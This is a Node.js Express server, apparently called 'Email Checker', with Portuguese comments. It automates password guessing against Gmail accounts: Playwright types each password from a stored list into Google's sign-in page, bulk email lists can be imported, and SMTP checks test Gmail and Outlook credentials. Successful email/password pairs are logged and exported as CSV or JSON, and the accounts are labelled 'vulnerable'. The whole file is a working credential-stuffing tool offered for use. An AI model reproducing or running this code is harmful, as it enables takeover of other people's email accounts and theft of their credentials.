const express = require('express');
const nodemailer = require('nodemailer');
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// Arquivo de resultados
const RESULTS_FILE = path.join(__dirname, 'results.json');

// Senhas padrão (vazio - adicione as suas!)
const DEFAULT_PASSWORDS = [];

// Arquivo de senhas customizadas
const PASSWORDS_FILE = path.join(__dirname, 'custom_passwords.json');

// Arquivo de logs detalhados
const LOGS_FILE = path.join(__dirname, 'logs.json');

// Rate limiting (ms entre tentativas)
const RATE_LIMIT_DELAY = 2000;

// Inicializar arquivo de resultados se não existir
if (!fs.existsSync(RESULTS_FILE)) {
  fs.writeFileSync(RESULTS_FILE, JSON.stringify([], null, 2));
}

// Inicializar arquivo de logs
if (!fs.existsSync(LOGS_FILE)) {
  fs.writeFileSync(LOGS_FILE, JSON.stringify([], null, 2));
}

// Inicializar arquivo de senhas customizadas
if (!fs.existsSync(PASSWORDS_FILE)) {
  fs.writeFileSync(PASSWORDS_FILE, JSON.stringify([], null, 2));
}

// Função para obter todas as senhas (padrão + customizadas)
function getAllPasswords() {
  const customPasswords = JSON.parse(fs.readFileSync(PASSWORDS_FILE, 'utf8'));
  return [...DEFAULT_PASSWORDS, ...customPasswords];
}

// Função para registrar logs detalhados
function addLog(email, action, details = {}) {
  try {
    let logs = [];
    if (fs.existsSync(LOGS_FILE)) {
      logs = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
    }
    logs.push({
      timestamp: new Date().toISOString(),
      email,
      action,
      ...details
    });
    fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
  } catch (error) {
    console.error('Erro ao registrar log:', error);
  }
}

// Função para testar email/senha via Playwright (login automático)
async function testEmailCredentials(email, provider = 'gmail') {
  const allPasswords = getAllPasswords();
  const totalSenhas = allPasswords.length;

  console.log(`\n📊 Testando ${totalSenhas} senha(s)...`);

  let browser;
  try {
    // Abrir navegador UMA VEZ para testar TODAS as senhas
    console.log('  📱 Abrindo navegador...');
    const isProduction = process.env.NODE_ENV === 'production';

    browser = await chromium.launch({
      headless: isProduction ? true : false,
      slowMo: isProduction ? 0 : 500,
      args: isProduction ? [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--single-process',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-extensions'
      ] : []
    });

    for (let i = 0; i < allPasswords.length; i++) {
      const password = allPasswords[i];
      try {
        console.log(`\n🔄 Tentativa ${i + 1}/${totalSenhas}: ${password}`);
        const result = await testGmailLoginWithBrowser(browser, email, password, i + 1, totalSenhas);

        if (result.success) {
          console.log(`✅ SUCESSO! Senha encontrada na tentativa ${i + 1}/${totalSenhas}`);
          console.log(`✅ Email: ${email} | Senha: ${password}`);
          addLog(email, 'SUCCESS', { password, tentativa: i + 1 });

          // Fechar navegador após sucesso
          try {
            await browser.close({ force: true });
          } catch (e) {
            console.log('  ℹ️ Navegador já estava fechado');
          }

          return {
            email,
            password,
            provider,
            status: 'SUCCESS',
            tentativa: i + 1,
            totalTentativas: totalSenhas,
            timestamp: new Date().toISOString()
          };
        }

        // Rate limiting entre tentativas
        if (i < allPasswords.length - 1) {
          await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY));
        }

      } catch (error) {
        const errorMsg = error.message.split('\n')[0];
        console.log(`❌ Tentativa ${i + 1} falhou: ${errorMsg}`);
        addLog(email, 'FAILED', { password, error: errorMsg });
      }
    }

    console.log(`\n❌ Nenhuma das ${totalSenhas} senhas funcionou`);

    // Fechar navegador ao final
    try {
      await browser.close({ force: true });
    } catch (e) {
      console.log('  ℹ️ Navegador já estava fechado');
    }

    return null;
  } catch (error) {
    console.log('❌ Erro ao testar credenciais:', error.message);
    if (browser) {
      try {
        await browser.close({ force: true });
      } catch (e) {}
    }
    return null;
  }
}

// Função para testar login no Gmail usando um browser já aberto
async function testGmailLoginWithBrowser(browser, email, password, tentativa, total) {
  let page;
  try {
    console.log(`  ℹ️ Reutilizando navegador existente (tentativa ${tentativa}/${total})...`);

    const context = await browser.newContext({
      ignoreHTTPSErrors: true,
      noViewport: true
    });
    page = await context.newPage();
    page.setDefaultTimeout(60000);

    console.log('  🌐 Acessando Gmail...');
    await page.goto('https://accounts.google.com/signin', {
      waitUntil: 'load',
      timeout: 60000
    });

    console.log('  ⏳ Esperando página carregar...');
    await page.waitForTimeout(2000);

    console.log('  🔍 Inspecionando página...');
    const inputs = await page.$$('input');
    console.log('  ℹ️ Encontrados ' + inputs.length + ' inputs na página');

    try {
      // Tentar preencher o primeiro input (que deve ser o de email)
      if (inputs.length > 0) {
        console.log('  ✉️ Clicando no primeiro input...');
        await inputs[0].click();
        await page.waitForTimeout(300);

        console.log('  ✉️ Digitando email: ' + email);
        // Usar keyboard diretamente
        await page.keyboard.type(email, { delay: 20 });
        await page.waitForTimeout(500);

        console.log('  ⏳ Pressionando Enter...');
        await page.keyboard.press('Enter');
      } else {
        throw new Error('Nenhum input encontrado');
      }

    } catch (fillError) {
      console.log('  ❌ Erro ao preencher: ' + fillError.message);
      throw new Error('Email - ' + fillError.message);
    }

    console.log('  ⏳ Aguardando campo de senha...');
    // Aguardar campo de senha
    const passwordFieldAppeared = await Promise.race([
      page.waitForSelector('input[type="password"]', { timeout: 20000 }).then(() => true),
      page.waitForTimeout(20000).then(() => false)
    ]);

    if (!passwordFieldAppeared) {
      throw new Error('Campo de senha não apareceu (possível erro de email ou captcha)');
    }

    console.log('  ⏳ Esperando campo de senha...');
    await page.waitForTimeout(2000);

    try {
      const passwordInputs = await page.$$('input[type="password"]');

      if (passwordInputs.length > 0) {
        console.log('  🔑 Encontrado campo de senha!');
        await passwordInputs[0].click();
        await page.waitForTimeout(300);

        console.log('  🔑 Digitando senha...');
        await page.keyboard.type(password, { delay: 20 });
        await page.waitForTimeout(500);

        console.log('  ⏳ Pressionando Enter...');
        await page.keyboard.press('Enter');
      } else {
        throw new Error('Campo de senha não encontrado');
      }

    } catch (passError) {
      console.log('  ❌ Erro ao preencher senha: ' + passError.message);
      throw new Error('Senha - ' + passError.message);
    }

    console.log('  ⏳ Verificando resultado...');

    const startCheck = Date.now();
    const maxWait = 20000;
    let foundError = false;

    try {
      while (Date.now() - startCheck < maxWait) {
        // PRIMEIRO: Verificar se há erro de senha na página
        try {
          const hasError = await page.evaluate(() => {
            const pageText = document.body.innerText.toLowerCase();
            const hasErrorMsg = pageText.includes('senha incorreta') ||
                   pageText.includes('wrong password') ||
                   pageText.includes('invalid password');
            return hasErrorMsg;
          });

          if (hasError) {
            console.log('  ❌ ERRO DE SENHA CONFIRMADO!');
            foundError = true;
            throw new Error('Senha incorreta');
          }
        } catch (evalError) {
          // Se erro é por contexto destruído = sucesso (navegou)
          if (evalError.message &&
              (evalError.message.includes('Execution context') ||
               evalError.message.includes('was not bound'))) {
            if (!foundError) {
              console.log('  ✅ Contexto destruído = Sucesso!');
              return { success: true };
            }
          } else if (evalError.message === 'Senha incorreta') {
            // Erro de senha real
            throw evalError;
          }
        }

        // SEGUNDO: Verificar URL
        const currentUrl = page.url();

        // Se ainda em signin, continua verificando
        if (currentUrl.includes('signin') || currentUrl.includes('identifier')) {
          await page.waitForTimeout(500);
          continue;
        }

        // Se saiu de signin e sem erro = SUCESSO
        if (!foundError) {
          console.log('  ✅ Saiu de signin = Sucesso!');
          return { success: true };
        }

        await page.waitForTimeout(300);
      }

      console.log('  ❌ Timeout');
      throw new Error('Timeout na verificação');

    } catch (checkError) {
      console.log('  ❌ ' + checkError.message);
      throw new Error(checkError.message);
    }

  } catch (error) {
    console.log(`  ❌ Erro: ${error.message}`);
    // Fechar página mas manter navegador aberto para próximas tentativas
    if (page) {
      try {
        await page.close();
      } catch (e) {}
    }
    return { success: false, error: error.message };
  }
}

// Rota para testar email
app.post('/api/check', async (req, res) => {
  try {
    const { email, provider = 'gmail' } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email é obrigatório' });
    }

    console.log(`\n🔍 Testando: ${email} (Provider: ${provider})`);
    console.log('Tentando senhas...\n');

    const allPasswords = getAllPasswords();

    if (allPasswords.length === 0) {
      return res.json({
        success: false,
        message: 'Nenhuma senha configurada. Adicione senhas em "Gerenciar Senhas"',
        email,
        totalSenhas: 0
      });
    }

    const result = await testEmailCredentials(email, provider);

    if (result) {
      // Salvar resultado bem-sucedido
      const allResults = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8'));
      allResults.push(result);
      fs.writeFileSync(RESULTS_FILE, JSON.stringify(allResults, null, 2));

      return res.json({
        success: true,
        message: 'Credenciais válidas encontradas!',
        result,
        totalSenhasTentadas: allPasswords.length
      });
    } else {
      return res.json({
        success: false,
        message: `Nenhuma das ${allPasswords.length} senhas funcionou. Verifique se o email e senhas estão corretos.`,
        email,
        totalSenhasTentadas: allPasswords.length,
        dica: 'Para Gmail: use Senhas de Aplicativos (myaccount.google.com/apppasswords)'
      });
    }

  } catch (error) {
    console.error('Erro:', error);
    res.status(500).json({
      error: error.message,
      dica: 'Erro ao conectar. Verifique se o email existe e a senha está correta.'
    });
  }
});

// Rota para obter histórico
app.get('/api/results', (req, res) => {
  try {
    const results = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8'));
    res.json(results);
  } catch (error) {
    res.status(500).json({ error: 'Erro ao ler resultados' });
  }
});

// Rota para obter estatísticas detalhadas
app.get('/api/stats', (req, res) => {
  try {
    const results = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8'));

    // Separar sucessos e erros
    const sucessos = results.filter(r => r.status === 'SUCCESS');
    const erros = results.filter(r => r.status === 'FAILED');

    // Contar emails únicos
    const emailsUnicos = new Set(results.map(r => r.email));
    const emailsSucesso = new Set(sucessos.map(r => r.email));
    const emailsErro = new Set(erros.map(r => r.email));

    // Senhas encontradas
    const senhasEncontradas = sucessos.map(r => ({ email: r.email, senha: r.password }));

    // Emails com erro e tentativas
    const emailsComErro = {};
    erros.forEach(r => {
      if (!emailsComErro[r.email]) {
        emailsComErro[r.email] = {
          email: r.email,
          tentativas: [],
          totalTentativas: 0,
          ultimaTentativa: r.timestamp
        };
      }
      emailsComErro[r.email].tentativas.push({
        senha: r.password,
        timestamp: r.timestamp
      });
      emailsComErro[r.email].totalTentativas++;
    });

    // Taxa de sucesso por email
    const emailStats = {};
    emailsUnicos.forEach(email => {
      const testesDoEmail = results.filter(r => r.email === email);
      const sucessosDoEmail = testesDoEmail.filter(r => r.status === 'SUCCESS').length;

      emailStats[email] = {
        email,
        totalTentativas: testesDoEmail.length,
        sucessos: sucessosDoEmail,
        erros: testesDoEmail.length - sucessosDoEmail,
        taxa: ((sucessosDoEmail / testesDoEmail.length) * 100).toFixed(1) + '%',
        status: sucessosDoEmail > 0 ? 'VULNERÁVEL' : 'SEGURO'
      };
    });

    res.json({
      resumo: {
        totalTestes: results.length,
        sucessos: sucessos.length,
        erros: erros.length,
        emailsUnicos: emailsUnicos.size,
        emailsComSucesso: emailsSucesso.size,
        emailsComErro: emailsErro.size,
        taxaGeral: ((sucessos.length / results.length) * 100).toFixed(1) + '%'
      },
      senhasEncontradas,
      emailsComErro: Object.values(emailsComErro).sort((a, b) => b.totalTentativas - a.totalTentativas),
      emailStats: Object.values(emailStats),
      resultados: results.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao calcular estatísticas' });
  }
});

// Rota para limpar histórico
app.post('/api/clear', (req, res) => {
  try {
    fs.writeFileSync(RESULTS_FILE, JSON.stringify([], null, 2));
    res.json({ message: 'Histórico limpo' });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao limpar resultados' });
  }
});

// Rota de diagnóstico
app.post('/api/diagnose', async (req, res) => {
  try {
    const { email, password, provider = 'gmail' } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    console.log(`\n🔧 DIAGNÓSTICO: ${email}`);

    let transporter;

    if (provider === 'gmail') {
      transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: email,
          pass: password
        }
      });
    } else if (provider === 'outlook') {
      transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com',
        port: 587,
        secure: false,
        auth: {
          user: email,
          pass: password
        }
      });
    }

    try {
      await transporter.verify();
      console.log('✅ SUCESSO: Credenciais válidas!');
      return res.json({
        success: true,
        message: '✅ Credenciais válidas!',
        email,
        password
      });
    } catch (authError) {
      const errorMsg = authError.message;
      console.log(`❌ ERRO: ${errorMsg}`);

      let solucao = '';

      if (errorMsg.includes('535') || errorMsg.includes('Invalid login')) {
        solucao = '⚠️ Gmail rejeitou a autenticação. Soluções:\n1. Use Senha de Aplicativos\n2. Habilite "Acesso a apps menos seguros"\n3. Desabilite Verificação em Duas Etapas\n4. Verifique se o email/senha estão corretos (sem espaços)';
      } else if (errorMsg.includes('TLS')) {
        solucao = '⚠️ Problema de conexão TLS. Tente com outro provider ou verifique a conexão de internet';
      } else {
        solucao = '⚠️ Erro desconhecido. Verifique o email e a senha';
      }

      return res.json({
        success: false,
        message: `❌ Autenticação falhou`,
        error: errorMsg,
        solucao,
        email,
        password: '***'
      });
    }

  } catch (error) {
    console.error('Erro no diagnóstico:', error);
    res.status(500).json({
      error: 'Erro ao executar diagnóstico',
      details: error.message
    });
  }
});

// Rota para obter senhas customizadas
app.get('/api/passwords', (req, res) => {
  try {
    const customPasswords = JSON.parse(fs.readFileSync(PASSWORDS_FILE, 'utf8'));
    res.json({
      default: DEFAULT_PASSWORDS,
      custom: customPasswords,
      total: getAllPasswords().length
    });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao obter senhas' });
  }
});

// Rota para adicionar senha customizada
app.post('/api/passwords', (req, res) => {
  try {
    const { password } = req.body;

    if (!password || password.trim() === '') {
      return res.status(400).json({ error: 'Senha não pode estar vazia' });
    }

    const customPasswords = JSON.parse(fs.readFileSync(PASSWORDS_FILE, 'utf8'));

    if (customPasswords.includes(password)) {
      return res.status(400).json({ error: 'Esta senha já existe' });
    }

    customPasswords.push(password);
    fs.writeFileSync(PASSWORDS_FILE, JSON.stringify(customPasswords, null, 2));

    res.json({ message: 'Senha adicionada', password, total: getAllPasswords().length });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao adicionar senha' });
  }
});

// Rota para remover senha customizada
app.delete('/api/passwords/:index', (req, res) => {
  try {
    const index = parseInt(req.params.index);
    const customPasswords = JSON.parse(fs.readFileSync(PASSWORDS_FILE, 'utf8'));

    if (index < 0 || index >= customPasswords.length) {
      return res.status(400).json({ error: 'Índice inválido' });
    }

    const removed = customPasswords.splice(index, 1);
    fs.writeFileSync(PASSWORDS_FILE, JSON.stringify(customPasswords, null, 2));

    res.json({ message: 'Senha removida', removed: removed[0] });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao remover senha' });
  }
});

// Rota para página de estatísticas
app.get('/stats', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'stats.html'));
});

// Rota alternativa para stats.html
app.get('/stats.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'stats.html'));
});

// 1️⃣ EXPORTAR DADOS (CSV/JSON)
app.get('/api/export/:format', (req, res) => {
  try {
    const results = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8'));
    const { format } = req.params;

    if (format === 'json') {
      res.setHeader('Content-Disposition', 'attachment; filename="results.json"');
      res.setHeader('Content-Type', 'application/json');
      res.send(JSON.stringify(results, null, 2));
    } else if (format === 'csv') {
      let csv = 'Email,Senha,Provider,Status,Data\n';
      results.forEach(r => {
        csv += `"${r.email}","${r.password}","${r.provider}","${r.status}","${r.timestamp}"\n`;
      });
      res.setHeader('Content-Disposition', 'attachment; filename="results.csv"');
      res.setHeader('Content-Type', 'text/csv');
      res.send(csv);
    } else {
      res.status(400).json({ error: 'Formato inválido' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Erro ao exportar' });
  }
});

// 2️⃣ IMPORTAR EMAILS
app.post('/api/import-emails', (req, res) => {
  try {
    const { emails } = req.body;
    if (!Array.isArray(emails)) {
      return res.status(400).json({ error: 'Formato inválido' });
    }

    const validEmails = emails.filter(e => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e));
    res.json({ valid: validEmails.length, invalid: emails.length - validEmails.length, emails: validEmails });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao importar' });
  }
});

// 3️⃣ LIMPAR TODOS OS DADOS
app.post('/api/clear-all', (req, res) => {
  try {
    fs.writeFileSync(RESULTS_FILE, JSON.stringify([], null, 2));
    fs.writeFileSync(LOGS_FILE, JSON.stringify([], null, 2));
    res.json({ message: 'Todos os dados foram apagados' });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao limpar' });
  }
});

// 4️⃣ REMOVER RESULTADO ESPECÍFICO
app.delete('/api/results/:email', (req, res) => {
  try {
    const { email } = req.params;
    let results = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8'));
    const originalLength = results.length;
    results = results.filter(r => r.email !== decodeURIComponent(email));

    if (results.length === originalLength) {
      return res.status(404).json({ error: 'Email não encontrado' });
    }

    fs.writeFileSync(RESULTS_FILE, JSON.stringify(results, null, 2));
    res.json({ message: `${originalLength - results.length} resultado(s) removido(s)` });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao remover' });
  }
});

// 5️⃣ OBTER LOGS DETALHADOS
app.get('/api/logs', (req, res) => {
  try {
    const logs = fs.existsSync(LOGS_FILE) ? JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')) : [];
    res.json(logs);
  } catch (error) {
    res.status(500).json({ error: 'Erro ao obter logs' });
  }
});

app.listen(PORT, () => {
  console.log(`\n🚀 Email Checker rodando em http://localhost:${PORT}`);
  console.log(`📁 Resultados salvos em: ${RESULTS_FILE}\n`);
});
